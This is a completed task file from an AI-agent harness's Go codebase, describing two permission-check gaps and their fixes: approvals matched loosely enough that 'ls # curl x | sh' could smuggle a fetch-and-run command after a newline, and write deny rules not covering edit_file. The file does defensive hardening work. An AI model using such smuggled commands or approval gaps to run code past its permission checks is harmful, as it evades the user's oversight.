---
title: An approval covers only the command shown, and a write rule covers edits
status: done
type: afk
blockedBy: []
prd: before-going-public
---

## What
An external agent's approved command is matched to its later terminal request by `strings.Fields`, so an approval for `ls # curl x | sh` covers `ls #` followed by a new line and `curl x | sh`. And `deny write_file(path)` does not stop `edit_file`, which is also what an external agent's writes are judged as.

## Acceptance
- A terminal request is covered only by an approval for the same command, byte for byte after trimming the ends; Go test in `internal/harness/acp` with the two commands above, written first.
- A path rule on `write_file` holds for `edit_file` and for an external agent's write, and one on `edit_file` for `write_file`; Go tests. The Rules page and the help say a rule on one covers both.

## Notes
- `internal/harness/acp/acp.go:853` (`covered`) and `:724`.

## Done
- `sameCommand` in `internal/harness/acp/acp.go` (spaces and tabs collapsed, newlines kept); `TestAnApprovalCoversOnlyTheCommandShown`.
- `Rule.toolMatches` in `internal/permission/rules.go`: a deny rule with a path on `write_file` or `edit_file` holds for both. Chosen over widening allow rules too, which would let an approval of one tool allow the other; the help pages say so. `TestAPathDenyRuleOnAWriteToolCoversTheOther`, `TestAWriteDenyRuleStopsAnExternalAgentsEdit`.
- Both failed before the change.
